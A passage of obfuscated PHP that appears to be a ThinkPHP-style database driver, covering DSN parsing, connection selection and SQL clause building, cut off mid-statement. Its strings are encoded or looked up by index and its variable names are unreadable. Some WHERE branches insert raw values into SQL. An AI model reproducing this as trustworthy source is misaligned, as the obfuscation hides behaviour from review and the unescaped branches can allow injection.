=> "\116\117\x54\40\x42\x45\x54\x57\x45\x45\116", "\x6e\x6f\164\x20\x62\x65\164\167\145\x65\x6e" => "\x4e\117\x54\x20\x42\x45\x54\x57\x45\105\116"); protected $selectSql = "\123\105\x4c\105\103\124\x25\x44\x49\123\x54\x49\116\x43\x54\45\40\45\x46\x49\105\114\x44\45\x20\106\x52\x4f\115\40\45\124\101\102\x4c\x45\x25\45\112\x4f\x49\116\45\45\x57\110\105\122\x45\x25\45\107\122\117\x55\x50\x25\45\x48\x41\x56\x49\116\x47\x25\x25\117\x52\104\105\x52\45\45\x4c\111\115\x49\x54\x25\40\x25\125\x4e\x49\117\116\x25\45\103\117\115\x4d\x45\x4e\124\45"; protected $bind = array(); public static function getInstance() { $ı©€õı¦ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[¡¬ıÜ ƒ][1048], $ı©€õı¦); } public function factory($Ü¼û Ôµ = '') { $¢µ…¦‡° =& $_SERVER[¡¬ıÜ ƒ]; $Ü¼û Ôµ = $this->parseConfig($Ü¼û Ôµ); if (empty($Ü¼û Ôµ[$¢µ…¦‡°[1049]])) { think_exception(think_lang($¢µ…¦‡°[1050])); } $this->dbType = ucwords(strtolower($Ü¼û Ôµ[$¢µ…¦‡°[1049]])); $¿¬åˆà = $¢µ…¦‡°[1051] . $this->dbType; if (class_exists($¿¬åˆà)) { $»ŸˆÓ = new $¿¬åˆà($Ü¼û Ôµ); if ($¢µ…¦‡°[1052] != strtolower($Ü¼û Ôµ[$¢µ…¦‡°[1049]])) { $»ŸˆÓ->dbType = strtoupper($this->dbType); } else { $»ŸˆÓ->dbType = $this->_getDsnType($Ü¼û Ôµ[$¢µ…¦‡°[1004]]); } } else { think_exception(think_lang($¢µ…¦‡°[1053]) . $¢µ…¦‡°[1054] . $¿¬åˆà); } return $»ŸˆÓ; } public function __call($â¬ØıÛ, $¼ÚâÜ) { if (method_exists($this, $â¬ØıÛ)) { return call_user_func_array(array($this, $â¬ØıÛ), $¼ÚâÜ); } } protected function _getDsnType($ºî¤â…‚) { $Æ€®Èê€ = explode($_SERVER[¡¬ıÜ ƒ][4], $ºî¤â…‚); $É¼’ŒÌ = strtoupper(trim($Æ€®Èê€[0])); return $É¼’ŒÌ; } private function parseConfig($½” öÈÉ = '') { $ŞÍÛ´á¦ =& $_SERVER[¡¬ıÜ ƒ]; if (!empty($½” öÈÉ) && is_string($½” öÈÉ)) { $½” öÈÉ = $this->parseDSN($½” öÈÉ); } elseif (is_array($½” öÈÉ)) { $½” öÈÉ = array_change_key_case($½” öÈÉ); $½” öÈÉ = array($ŞÍÛ´á¦[1049] => $½” öÈÉ[$ŞÍÛ´á¦[1055]], $ŞÍÛ´á¦[976] => $½” öÈÉ[$ŞÍÛ´á¦[1056]], $ŞÍÛ´á¦[977] => $½” öÈÉ[$ŞÍÛ´á¦[1057]], $ŞÍÛ´á¦[974] => $½” öÈÉ[$ŞÍÛ´á¦[1058]], $ŞÍÛ´á¦[975] => $½” öÈÉ[$ŞÍÛ´á¦[1059]], $ŞÍÛ´á¦[21] => $½” öÈÉ[$ŞÍÛ´á¦[1060]], $ŞÍÛ´á¦[1004] => $½” öÈÉ[$ŞÍÛ´á¦[1061]], $ŞÍÛ´á¦[17] => isset($½” öÈÉ[$ŞÍÛ´á¦[1062]]) ? $½” öÈÉ[$ŞÍÛ´á¦[1062]] : array()); } elseif (empty($½” öÈÉ)) { if (think_config($ŞÍÛ´á¦[1063]) && $ŞÍÛ´á¦[1052] != strtolower(think_config($ŞÍÛ´á¦[1064]))) { $½” öÈÉ = $this->parseDSN(think_config($ŞÍÛ´á¦[1063])); } else { $½” öÈÉ = array($ŞÍÛ´á¦[1049] => think_config($ŞÍÛ´á¦[1064]), $ŞÍÛ´á¦[976] => think_config($ŞÍÛ´á¦[1065]), $ŞÍÛ´á¦[977] => think_config($ŞÍÛ´á¦[1066]), $ŞÍÛ´á¦[974] => think_config($ŞÍÛ´á¦[1067]), $ŞÍÛ´á¦[975] => think_config($ŞÍÛ´á¦[1068]), $ŞÍÛ´á¦[21] => think_config($ŞÍÛ´á¦[325]), $ŞÍÛ´á¦[1004] => think_config($ŞÍÛ´á¦[1063]), $ŞÍÛ´á¦[17] => think_config($ŞÍÛ´á¦[1069])); } } return $½” öÈÉ; } protected function initConnect($—İÃÁ”´ = true) { if (1 == think_config($_SERVER[¡¬ıÜ ƒ][22])) { $this->_linkID = $this->multiConnect($—İÃÁ”´); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $û³èáŸÜ => $¿ş€Œç) { $this->_linkID = $¿ş€Œç; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($õïÌ±Õî = false) { $§Ñ±‘¾ =& $_SERVER[¡¬ıÜ ƒ]; static $ËÒ—û  = array(); static $±°úù°ä = -1; if (empty($ËÒ—û )) { foreach ($this->config as $†§¦›ùÙ => $¡ı–øı) { $ËÒ—û [$†§¦›ùÙ] = explode($§Ñ±‘¾[50], $¡ı–øı); } } if (think_config($§Ñ±‘¾[1070])) { if ($õïÌ±Õî || think_config($§Ñ±‘¾[473]) === !0) { $â¸Š¸ = floor(mt_rand(0, think_config($§Ñ±‘¾[1071]) - 1)); $±°úù°ä = $â¸Š¸; } else { if (is_numeric(think_config($§Ñ±‘¾[1072]))) { $â¸Š¸ = think_config($§Ñ±‘¾[1072]); } else { $â¸Š¸ = floor(mt_rand(think_config($§Ñ±‘¾[1071]), count($ËÒ—û [$§Ñ±‘¾[974]]) - 1)); } } } else { $â¸Š¸ = floor(mt_rand(0, count($ËÒ—û [$§Ñ±‘¾[974]]) - 1)); $±°úù°ä = $â¸Š¸; } $â¸Š¸ = $±°úù°ä !== -1 ? $±°úù°ä : $â¸Š¸; $ÚÀ¡á”ô = array($§Ñ±‘¾[976] => isset($ËÒ—û [$§Ñ±‘¾[976]][$â¸Š¸]) ? $ËÒ—û [$§Ñ±‘¾[976]][$â¸Š¸] : $ËÒ—û [$§Ñ±‘¾[976]][0], $§Ñ±‘¾[977] => isset($ËÒ—û [$§Ñ±‘¾[977]][$â¸Š¸]) ? $ËÒ—û [$§Ñ±‘¾[977]][$â¸Š¸] : $ËÒ—û [$§Ñ±‘¾[977]][0], $§Ñ±‘¾[974] => isset($ËÒ—û [$§Ñ±‘¾[974]][$â¸Š¸]) ? $ËÒ—û [$§Ñ±‘¾[974]][$â¸Š¸] : $ËÒ—û [$§Ñ±‘¾[974]][0], $§Ñ±‘¾[975] => isset($ËÒ—û [$§Ñ±‘¾[975]][$â¸Š¸]) ? $ËÒ—û [$§Ñ±‘¾[975]][$â¸Š¸] : $ËÒ—û [$§Ñ±‘¾[975]][0], $§Ñ±‘¾[21] => isset($ËÒ—û [$§Ñ±‘¾[21]][$â¸Š¸]) ? $ËÒ—û [$§Ñ±‘¾[21]][$â¸Š¸] : $ËÒ—û [$§Ñ±‘¾[21]][0], $§Ñ±‘¾[1004] => isset($ËÒ—û [$§Ñ±‘¾[1004]][$â¸Š¸]) ? $ËÒ—û [$§Ñ±‘¾[1004]][$â¸Š¸] : $ËÒ—û [$§Ñ±‘¾[1004]][0], $§Ñ±‘¾[17] => isset($ËÒ—û [$§Ñ±‘¾[17]][$â¸Š¸]) ? $ËÒ—û [$§Ñ±‘¾[17]][$â¸Š¸] : $ËÒ—û [$§Ñ±‘¾[17]][0]); return $this->connect($ÚÀ¡á”ô, $â¸Š¸); } public function parseDSN($Úğê§ç´) { $½ä–¡ºÅ =& $_SERVER[¡¬ıÜ ƒ]; if (empty($Úğê§ç´)) { return !1; } $ÅİÀØÌ» = parse_url($Úğê§ç´); if ($ÅİÀØÌ»[$½ä–¡ºÅ[207]]) { $¿ğÇÍ–é = array($½ä–¡ºÅ[1049] => $ÅİÀØÌ»[$½ä–¡ºÅ[207]], $½ä–¡ºÅ[976] => isset($ÅİÀØÌ»[$½ä–¡ºÅ[667]]) ? $ÅİÀØÌ»[$½ä–¡ºÅ[667]] : $½ä–¡ºÅ[12], $½ä–¡ºÅ[977] => isset($ÅİÀØÌ»[$½ä–¡ºÅ[1073]]) ? $ÅİÀØÌ»[$½ä–¡ºÅ[1073]] : $½ä–¡ºÅ[12], $½ä–¡ºÅ[974] => isset($ÅİÀØÌ»[$½ä–¡ºÅ[208]]) ? $ÅİÀØÌ»[$½ä–¡ºÅ[208]] : $½ä–¡ºÅ[12], $½ä–¡ºÅ[975] => isset($ÅİÀØÌ»[$½ä–¡ºÅ[209]]) ? $ÅİÀØÌ»[$½ä–¡ºÅ[209]] : $½ä–¡ºÅ[12], $½ä–¡ºÅ[21] => isset($ÅİÀØÌ»[$½ä–¡ºÅ[87]]) ? substr($ÅİÀØÌ»[$½ä–¡ºÅ[87]], 1) : $½ä–¡ºÅ[12]); } else { preg_match($½ä–¡ºÅ[1074], trim($Úğê§ç´), $™Æºà­Ş); $¿ğÇÍ–é = array($½ä–¡ºÅ[1049] => $™Æºà­Ş[1], $½ä–¡ºÅ[976] => $™Æºà­Ş[2], $½ä–¡ºÅ[977] => $™Æºà­Ş[3], $½ä–¡ºÅ[974] => $™Æºà­Ş[4], $½ä–¡ºÅ[975] => $™Æºà­Ş[5], $½ä–¡ºÅ[21] => $™Æºà­Ş[6]); } $¿ğÇÍ–é[$½ä–¡ºÅ[1004]] = $½ä–¡ºÅ[12]; return $¿ğÇÍ–é; } protected function debug() { $§…Èòç =& $_SERVER[¡¬ıÜ ƒ]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $§…Èòç[1075]; if (think_config($§…Èòç[1076])) { think_status($§…Èòç[1077]); think_trace($this->queryStr . $§…Èòç[1078] . think_status($§…Èòç[24], $§…Èòç[1077], 6) . $§…Èòç[1079], $§…Èòç[12], $§…Èòç[1080]); } } protected function parseLock($í·ƒÃºø = false) { $¼’Ü§§“ =& $_SERVER[¡¬ıÜ ƒ]; if (!$í·ƒÃºø) { return $¼’Ü§§“[12]; } if ($¼’Ü§§“[1006] == $this->dbType) { return $¼’Ü§§“[1081]; } return $¼’Ü§§“[1082]; } protected function parseSet($‘åéÑî) { $äè‘òÑÜ =& $_SERVER[¡¬ıÜ ƒ]; foreach ($‘åéÑî as $Ò¡³úËÁ => $úŠ¤œğ) { if (is_array($úŠ¤œğ) && $äè‘òÑÜ[374] == $úŠ¤œğ[0]) { $ÅıÌ’Ê¡[] = $this->parseKey($Ò¡³úËÁ) . $äè‘òÑÜ[508] . $úŠ¤œğ[1]; } elseif (is_scalar($úŠ¤œğ) || is_null($úŠ¤œğ)) { $ÅıÌ’Ê¡[] = $this->parseKey($Ò¡³úËÁ) . $äè‘òÑÜ[508] . $this->parseValue($úŠ¤œğ); } } return $äè‘òÑÜ[1083] . implode($äè‘òÑÜ[50], $ÅıÌ’Ê¡); } protected function bindParam($­óç¼í, $¤ĞüÖìç) { $this->bind[$_SERVER[¡¬ıÜ ƒ][4] . $­óç¼í] = $¤ĞüÖìç; } protected function parseBind($í¤ãÒÀ) { $í¤ãÒÀ = array_merge($this->bind, $í¤ãÒÀ); $this->bind = array(); return $í¤ãÒÀ; } function parseKey(&$«ĞÍ€ıŸ, $¶Ã‘½éœ = true) { if ($¶Ã‘½éœ) { $«ĞÍ€ıŸ = $this->parseKeyCheck($«ĞÍ€ıŸ); } return $«ĞÍ€ıŸ; } function parseKeyCheck($Å…È‚ º) { $¶»öÔØ£ =& $_SERVER[¡¬ıÜ ƒ]; $Å…È‚ º = trim($Å…È‚ º); if (!preg_match($¶»öÔØ£[1084], $Å…È‚ º)) { think_exception($¶»öÔØ£[1085] . $Å…È‚ º); } return $Å…È‚ º; } protected function parseValue($›ì«îŞØ) { $Šùôì€ˆ =& $_SERVER[¡¬ıÜ ƒ]; if (is_string($›ì«îŞØ)) { $›ì«îŞØ = $Šùôì€ˆ[1045] . $this->escapeString($›ì«îŞØ) . $Šùôì€ˆ[1045]; } elseif (isset($›ì«îŞØ[0]) && is_string($›ì«îŞØ[0]) && strtolower($›ì«îŞØ[0]) == $Šùôì€ˆ[374]) { $›ì«îŞØ = $this->escapeString($›ì«îŞØ[1]); } elseif (is_array($›ì«îŞØ)) { $›ì«îŞØ = array_map(array($this, $Šùôì€ˆ[1046]), $›ì«îŞØ); } elseif (is_bool($›ì«îŞØ)) { $›ì«îŞØ = $›ì«îŞØ ? $Šùôì€ˆ[91] : $Šùôì€ˆ[230]; } elseif (is_null($›ì«îŞØ)) { $›ì«îŞØ = $Šùôì€ˆ[106]; } return $›ì«îŞØ; } protected function parseField($³¯¾ÇÏ) { $ôûƒËú =& $_SERVER[¡¬ıÜ ƒ]; if (is_string($³¯¾ÇÏ) && strpos($³¯¾ÇÏ, $ôûƒËú[50])) { $³¯¾ÇÏ = explode($ôûƒËú[50], $³¯¾ÇÏ); } if (is_array($³¯¾ÇÏ)) { $†Éñóµá = array(); foreach ($³¯¾ÇÏ as $éª´‘Â€ => $ğíëÅ­á) { if (!is_numeric($éª´‘Â€)) { $†Éñóµá[] = $this->parseKey($éª´‘Â€, !1) . $ôûƒËú[1086] . $this->parseKey($ğíëÅ­á); } else { $†Éñóµá[] = $this->parseKey($ğíëÅ­á); } } $‘á•´Ïœ = implode($ôûƒËú[50], $†Éñóµá); } elseif (is_string($³¯¾ÇÏ) && !empty($³¯¾ÇÏ)) { $‘á•´Ïœ = $³¯¾ÇÏ; } else { $‘á•´Ïœ = $ôûƒËú[222]; } return $‘á•´Ïœ; } protected function parseTable($÷–øÊ´™) { $ò‚ÖÍ—À =& $_SERVER[¡¬ıÜ ƒ]; if (is_array($÷–øÊ´™)) { $ø÷´íğ„ = array(); foreach ($÷–øÊ´™ as $ÁÄë¼í => $Äù©¡Ï) { if (!is_numeric($ÁÄë¼í)) { $ø÷´íğ„[] = $this->parseKey($ÁÄë¼í) . $ò‚ÖÍ—À[53] . $this->parseKey($Äù©¡Ï); } else { $ø÷´íğ„[] = $this->parseKey($ÁÄë¼í); } } $÷–øÊ´™ = $ø÷´íğ„; } elseif (is_string($÷–øÊ´™)) { if (strstr($÷–øÊ´™, $ò‚ÖÍ—À[53])) { return $÷–øÊ´™; } $÷–øÊ´™ = explode($ò‚ÖÍ—À[50], $÷–øÊ´™); array_walk($÷–øÊ´™, array($this, $ò‚ÖÍ—À[994])); } return $ò‚ÖÍ—À[988] . trim(implode($ò‚ÖÍ—À[1087], $÷–øÊ´™), $ò‚ÖÍ—À[463]) . $ò‚ÖÍ—À[988]; } protected function parseWhere($ş€úŸöê) { $îŒÉœı“ =& $_SERVER[¡¬ıÜ ƒ]; $Çß ˆáˆ = $îŒÉœı“[12]; if (is_string($ş€úŸöê)) { $Çß ˆáˆ = $ş€úŸöê; } else { $„››Ä’¨ = isset($ş€úŸöê[$îŒÉœı“[1088]]) ? strtoupper($ş€úŸöê[$îŒÉœı“[1088]]) : $îŒÉœı“[12]; if (in_array($„››Ä’¨, array($îŒÉœı“[1089], $îŒÉœı“[1090], $îŒÉœı“[1091]))) { $„››Ä’¨ = $îŒÉœı“[53] . $„››Ä’¨ . $îŒÉœı“[53]; unset($ş€úŸöê[$îŒÉœı“[1088]]); } else { $„››Ä’¨ = $îŒÉœı“[1092]; } foreach ($ş€úŸöê as $ÂÂ«€Ôş => $Šœºšêş) { $Çß ˆáˆ .= $îŒÉœı“[356]; if (is_numeric($ÂÂ«€Ôş)) { $ÂÂ«€Ôş = $îŒÉœı“[1093]; } if (0 === strpos($ÂÂ«€Ôş, $îŒÉœı“[11])) { $Çß ˆáˆ .= $this->parseThinkWhere($ÂÂ«€Ôş, $Šœºšêş); } else { if (!preg_match($îŒÉœı“[1094], trim($ÂÂ«€Ôş))) { think_exception(think_lang($îŒÉœı“[1095]) . $îŒÉœı“[4] . $ÂÂ«€Ôş); } $úâÏüé÷ = is_array($Šœºšêş) && isset($Šœºšêş[$îŒÉœı“[1096]]); $ÂÂ«€Ôş = trim($ÂÂ«€Ôş); if (strpos($ÂÂ«€Ôş, $îŒÉœı“[214])) { $„âë„‚¢ = explode($îŒÉœı“[214], $ÂÂ«€Ôş); $ á‘¿’ = array(); foreach ($„âë„‚¢ as $×‰’Ñ— => $¤ŞÅÕù) { $çÃÌŞ€’ = $úâÏüé÷ ? $Šœºšêş[$×‰’Ñ—] : $Šœºšêş; $ á‘¿’[] = $îŒÉœı“[339] . $this->parseWhereItem($this->parseKey($¤ŞÅÕù), $çÃÌŞ€’) . $îŒÉœı“[993]; } $Çß ˆáˆ .= implode($îŒÉœı“[1097], $ á‘¿’); } elseif (strpos($ÂÂ«€Ôş, $îŒÉœı“[286])) { $„âë„‚¢ = explode($îŒÉœı“[286], $ÂÂ«€Ôş); $ á‘¿’ = array(); foreach ($„âë„‚¢ as $×‰’Ñ— => $¤ŞÅÕù) { $çÃÌŞ€’ = $úâÏüé÷ ? $Šœºšêş[$×‰’Ñ—] : $Šœºšêş; $ á‘¿’[] = $îŒÉœı“[339] . $this->parseWhereItem($this->parseKey($¤ŞÅÕù), $çÃÌŞ€’) . $îŒÉœı“[993]; } $Çß ˆáˆ .= implode($îŒÉœı“[1092], $ á‘¿’); } else { $Çß ˆáˆ .= $this->parseWhereItem($this->parseKey($ÂÂ«€Ôş), $Šœºšêş); } } $Çß ˆáˆ .= $îŒÉœı“[357] . $„››Ä’¨; } $Çß ˆáˆ = substr($Çß ˆáˆ, 0, -strlen($„››Ä’¨)); } return empty($Çß ˆáˆ) ? $îŒÉœı“[12] : $îŒÉœı“[1098] . $Çß ˆáˆ; } protected function parseWhereItem($ßêîÊı, $•œ½Ï€“) { $êèƒ”àÈ =& $_SERVER[¡¬ıÜ ƒ]; $¤ğŒ‡á„ = $êèƒ”àÈ[12]; if (is_array($•œ½Ï€“)) { if (is_string($•œ½Ï€“[0])) { $£İşøº = strtolower($•œ½Ï€“[0]); if (in_array($•œ½Ï€“[0], array($êèƒ”àÈ[508], $êèƒ”àÈ[1099], $êèƒ”àÈ[1100], $êèƒ”àÈ[1101], $êèƒ”àÈ[1102], $êèƒ”àÈ[1103]))) { $¤ğŒ‡á„ .= $ßêîÊı . $êèƒ”àÈ[53] . $•œ½Ï€“[0] . $êèƒ”àÈ[53] . $this->parseValue($•œ½Ï€“[1]); } elseif (preg_match($êèƒ”àÈ[1104], $•œ½Ï€“[0])) { $¤ğŒ‡á„ .= $ßêîÊı . $êèƒ”àÈ[53] . $this->exp[$£İşøº] . $êèƒ”àÈ[53] . $this->parseValue($•œ½Ï€“[1]); } elseif (preg_match($êèƒ”àÈ[1105], $•œ½Ï€“[0])) { if (is_array($•œ½Ï€“[1])) { $ÊÄÅª‘€ = isset($•œ½Ï€“[2]) ? strtoupper($•œ½Ï€“[2]) : $êèƒ”àÈ[1090]; if (in_array($ÊÄÅª‘€, array($êèƒ”àÈ[1089], $êèƒ”àÈ[1090], $êèƒ”àÈ[1091]))) { $éúóõö = array(); foreach ($•œ½Ï€“[1] as $ÓûªËÊ±) { $éúóõö[] = $ßêîÊı . $êèƒ”àÈ[53] . $this->exp[$£İşøº] . $êèƒ”àÈ[53] . $this->parseValue($ÓûªËÊ±); } $¤ğŒ‡á„ .= $êèƒ”àÈ[339] . implode($êèƒ”àÈ[53] . $ÊÄÅª‘€ . $êèƒ”àÈ[53], $éúóõö) . $êèƒ”àÈ[993]; } } else { $¤ğŒ‡á„ .= $ßêîÊı . $êèƒ”àÈ[53] . $this->exp[$£İşøº] . $êèƒ”àÈ[53] . $this->parseValue($•œ½Ï€“[1]); } } elseif ($êèƒ”àÈ[374] == $£İşøº) { $¤ğŒ‡á„ .= $êèƒ”àÈ[991] . $ßêîÊı . $êèƒ”àÈ[53] . $•œ½Ï€“[1] . $êèƒ”àÈ[1106]; } elseif (preg_match($êèƒ”àÈ[1107], $•œ½Ï€“[0])) { $¤ğŒ‡á„ .= $•œ½Ï€“[0]; } elseif (preg_match($êèƒ”àÈ[1108], $•œ½Ï€“[0])) { if (isset($•œ½Ï€“[2]) && $êèƒ”àÈ[374] == $•œ½Ï€“[2]) { $¤ğŒ‡á„ .= $ßêîÊı . $êèƒ”àÈ[53] . $this->exp[$£İşøº] . $êèƒ”àÈ[53] . $•œ½Ï€“[1]; } else { if (is_string($•œ½Ï€“[1])) { $•œ½Ï€“[1] = explode($êèƒ”àÈ[50], $•œ½Ï€“[1]); } $¥ışÖêÛ = implode($êèƒ”àÈ[50], $this->parseValue($•œ½Ï€“[1])); $¤ğŒ‡á„ .= $ßêîÊı . $êèƒ”àÈ[53] . $this->exp[$£İşøº] . $êèƒ”àÈ[991] . $¥ışÖêÛ . $êèƒ”àÈ[993]; } } elseif (preg_match($êèƒ”àÈ[1109], $•œ½Ï€“[0])) { $åÔÃ¬‚Ï = is_string($•œ½Ï€“[1]) ? explode($êèƒ”àÈ[50], $•œ½Ï€“[1]) : $•œ½Ï€“[1]; $¤ğŒ‡á„ .= $êèƒ”àÈ[991] . $ßêîÊı . $êèƒ”àÈ[53] . $this->exp[$£İşøº] . $êèƒ”àÈ[53] . $this->parseValue($åÔÃ¬‚Ï[0]) . $êèƒ”àÈ[1092] . $this->parseValue($åÔÃ¬‚Ï[1]) . $êèƒ”àÈ[357]; } else { think_exception(think_lang($êèƒ”àÈ[1095]) . $êèƒ”àÈ[4] . $•œ½Ï€“[0]); } } else { $ğı¶±² = count($•œ½Ï€“); $ÅÜí”ÎÖ = $êèƒ”àÈ[12]; if (is_string($•œ½Ï€“[$ğı¶±² - 1])) { $ÅÜí”ÎÖ = isset($•œ½Ï€“[$ğı¶±² - 1]) ? strtoupper($•œ½Ï€“[$ğı¶±² - 1]) : $êèƒ”àÈ[12]; if (in_array($ÅÜí”ÎÖ, array($êèƒ”àÈ[1089], $êèƒ”àÈ[1090], $êèƒ”àÈ[1091]))) { $ğı¶±² = $ğı¶±² - 1; } } else { $ÅÜí”ÎÖ = $êèƒ”àÈ[1089]; } for ($ñœ•ä¯ = 0; $ñœ•ä¯ < $ğı¶±²; $ñœ•ä¯++) { $åÔÃ¬‚Ï = is_array($•œ½Ï€“[$ñœ•ä¯]) ? $•œ½Ï€“[$ñœ•ä¯][1] : $•œ½Ï€“[$ñœ•ä¯]; if ($êèƒ”àÈ[374] == strtolower($•œ½Ï€“[$ñœ•ä¯][0])) { $¤ğŒ‡á„ .= $êèƒ”àÈ[339] . $ßêîÊı . $êèƒ”àÈ[53] . $åÔÃ¬‚Ï . $êèƒ”àÈ[1106] . $ÅÜí”ÎÖ . $êèƒ”àÈ[53]; } else { $åƒ–öÈŒ = is_array($•œ½Ï€“[$ñœ•ä¯]) ? $this->exp[strtolower($•œ½Ï€“[$ñœ•ä¯][0])] : $êèƒ”àÈ[508]; if (!$åƒ–öÈŒ && is_array($•œ½Ï€“[$ñœ•ä¯]) && in_array($•œ½Ï€“[$ñœ•ä¯][0], array($êèƒ”àÈ[508], $êèƒ”àÈ[1099], $êèƒ”àÈ[1100], $êèƒ”àÈ[1101], $êèƒ”àÈ[1102], $êèƒ”àÈ[1103]))) { $åƒ–öÈŒ = $•œ½Ï€“[$ñœ•ä¯][0]; } $¤ğŒ‡á„ .= $êèƒ”àÈ[339] . $ßêîÊı . $êèƒ”àÈ[53] . $åƒ–öÈŒ . $êèƒ”àÈ[53] . $this->parseValue($åÔÃ¬‚Ï) . $êèƒ”àÈ[1106] . $ÅÜí”ÎÖ . $êèƒ”àÈ[53]; } } $¤ğŒ‡á„ = substr($¤ğŒ‡á„, 0, -4); } } else { $¤ğŒ‡á„ .= $ßêîÊı . $êèƒ”àÈ[1110] . $this->parseValue($•œ½Ï€“); } return $¤ğŒ‡á„; } protected function parseThinkWhere($¤›ÕÎ¹œ, $ÃÏÏÓ§Ó) { $ŸÀ”…Ğ =& $_SERVER[¡¬ıÜ ƒ]; $«ºØˆŞò = $ŸÀ”…Ğ[12]; switch ($¤›ÕÎ¹œ) { case $ŸÀ”…Ğ[429]: $«ºØˆŞò = $ÃÏÏÓ§Ó; break; case $ŸÀ”…Ğ[1093]: $«ºØˆŞò = is_string($ÃÏÏÓ§Ó) ? $ÃÏÏÓ§Ó : substr($this->parseWhere($ÃÏÏÓ§Ó), 6); break; case $ŸÀ”…Ğ[1111]: parse_str($ÃÏÏÓ§Ó, $Ë×Â ÓÊ); if (isset($Ë×Â ÓÊ[$ŸÀ”…Ğ[1088]])) { $ë¿·©¡  = $ŸÀ”…Ğ[53] . strtoupper($Ë×Â ÓÊ[$ŸÀ”…Ğ[1088]]) . $ŸÀ”…Ğ[53]; unset($Ë×Â ÓÊ[$ŸÀ”…Ğ[1088]]); } else { $ë¿·©¡  = $ŸÀ”…Ğ[1092]; } $ŞÇ“’Ìì = array(); foreach ($Ë×Â ÓÊ as $é§Ó±¶Ç => $¨²ßôÅ) { $ŞÇ“’Ìì[] = $this->parseKey($é§Ó±¶Ç) . $ŸÀ”…Ğ[1110] . $this->parseValue($¨²ßôÅ); } $«ºØˆŞò = implode($ë¿·©¡ , $ŞÇ“’Ìì); break; } return $«ºØˆŞò; } protected function parseLimit($©³ß¤£ğ) { $šöÇá¦ =& $_SERVER[¡¬ıÜ ƒ]; return !empty($©³ß¤£ğ) ? $šöÇá¦[51] . $©³ß¤£ğ . $šöÇá¦[53] : $šöÇá¦[12]; } protected function parseJoin($‘Ê€¦“) { $òúĞÑş =& $_SERVER[¡¬ıÜ ƒ]; $œÆŠÁû½ = $òúĞÑş[12]; if (!empty($‘Ê€¦“)) { if (is_array($‘Ê€¦“)) { foreach ($‘Ê€¦“ as $ğÔŠÛ¢İ => $—À×½Ğí) { if (!1 !== stripos($—À×½Ğí, $òúĞÑş[1112])) { $œÆŠÁû½ .= $òúĞÑş[53] . $—À×½Ğí; } else { $œÆŠÁû½ .= $òúĞÑş[1113] . $—À×½Ğí; } } } else { $œÆŠÁû½ .= $òúĞÑş[1113] . $‘Ê€¦“; } } $œÆŠÁû½ = preg_replace($òúĞÑş[1114], think_config($òúĞÑş[1018]) . $òúĞÑş[1115], $œÆŠÁû½); return $œÆŠÁû½; } protected function parseOrder($ª˜õÈ) { $ıÀ¡ıĞÏ =& $_SERVER[¡¬ıÜ ƒ]; if (is_array($ª˜õÈ)) { $ÃìÀ±’ = array(); foreach ($ª˜õÈ as $ÂÕ¨¤¾« => $Ïœ¹Ï¿Û) { if (is_numeric($ÂÕ¨¤¾«)) { $ÃìÀ±’[] = $this->parseKey($Ïœ¹Ï¿Û); } else { $Ïœ¹Ï¿Û = in_array(strtoupper(trim($Ïœ¹Ï¿Û)), array($ıÀ¡ıĞÏ[1116], $ıÀ¡ıĞÏ[1117])) ? $ıÀ¡ıĞÏ[53] . $Ïœ¹Ï¿Û : $ıÀ¡ıĞÏ[12]; if (preg_match($ıÀ¡ıĞÏ[1118], $ÂÕ¨¤¾«)) { $ÃìÀ±’[] = $this->parseKey($ÂÕ¨¤¾«) . $Ïœ¹Ï¿Û; } else { think_exception($ıÀ¡ıĞÏ[1119] . $ÂÕ¨¤¾«); } } } $ª˜õÈ = implode($ıÀ¡ıĞÏ[50], $ÃìÀ±’); } return !empty($ª˜õÈ) ? $ıÀ¡ıĞÏ[1120] . $ª˜õÈ : $ıÀ¡ıĞÏ[12]; } protected function parseGroup($¶ìúÊéœ) { $¿Á¾ñù› =& $_SERVER[¡¬ıÜ ƒ]; return !empty($¶ìúÊéœ) ? $¿Á¾ñù›[1121] . $¶ìúÊéœ : $¿Á¾ñù›[12]; } protected function parseHaving($ÀÄÚ½€Ô) { $ÂŒÍÎÄ™ =& $_SERVER[¡¬ıÜ ƒ]; return !empty($ÀÄÚ½€Ô) ? $ÂŒÍÎÄ™[1122] . $ÀÄÚ½€Ô : $ÂŒÍÎÄ™[12]; } protected function parseComment($„‚–å¿ú) { $è…÷ùü =& $_SERVER[¡¬ıÜ ƒ]; return !empty($„‚–å¿ú) ? $è…÷ùü[1123] . $„‚–å¿ú . $è…÷ùü[1124] : $è…÷ùü[12]; } protected function parseDistinct($ØªÊ‘ÇÉ) { $Á­ûóâÊ =& $_SERVER[¡¬ıÜ ƒ]; return !empty($ØªÊ‘ÇÉ) ? $Á­ûóâÊ[1125] : $Á­ûóâÊ[12]; } protected function parseUnion($õÆ©¬Ø×) { $©ÂíÉ’ß =& $_SERVER[¡¬ıÜ ƒ]; if (empty($õÆ©¬Ø×)) { return $©ÂíÉ’ß[12]; } if (isset($õÆ©¬Ø×[$©ÂíÉ’ß[425]])) { $î’ã“ªé = $©ÂíÉ’ß[1126]; unset($õÆ©¬Ø×[$©ÂíÉ’ß[425]]); } else { $î’ã“ªé = $©ÂíÉ’ß[1127]; } foreach ($õÆ©¬Ø× as $ÃœùòÒï) { $Ößˆ«ù¯[] = $î’ã“ªé . (is_array($ÃœùòÒï) ? $this->buildSelectSql($ÃœùòÒï) : $ÃœùòÒï); } return implode($©ÂíÉ’ß[53], $Ößˆ«ù¯); } public function insert($¬“¾ãõ», $ÅÓ‡÷Âš = array(), $ˆ¯‚ş¶¢ = false) { $ªÄ‡ğ‚ˆ =& $_SERVER[¡¬ıÜ ƒ]; $Îåş¬ = $Ë½Û¨š = array(); $this->model = $ÅÓ‡÷Âš[$ªÄ‡ğ‚ˆ[360]]; foreach ($¬“¾ãõ» as $½¥˜Ù => $æŒëÜúƒ) { if (is_array($æŒëÜúƒ) && $ªÄ‡ğ‚ˆ[374] == $æŒëÜúƒ[0]) { $Ë½Û¨š[] = $this->parseKey($½¥˜Ù); $Îåş¬[] = $æŒëÜúƒ[1]; } elseif (is_scalar($æŒëÜúƒ) || is_null($æŒëÜúƒ)) { $Ë½Û¨š[] = 